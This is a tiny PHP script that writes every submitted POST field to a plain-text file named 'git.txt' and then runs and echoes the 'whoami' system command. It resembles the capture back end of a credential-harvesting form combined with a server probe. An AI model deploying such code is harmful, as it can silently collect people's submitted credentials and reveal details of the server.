<?php 
	 $file = 'git.txt'; 
	 $arr= $_POST; 
	 $fp = fopen($file, 'w') or die('Could not open file!');  
	 foreach ($arr as $key => $value) { 
			$toFile = "Key: $key; Value: $value \n"; 
			// write to file  
			fwrite($fp, "$toFile") or die('Could not write to file');  
			// close file  
	 } 
	 fclose($fp); 
	 echo	exec("whoami");
?>
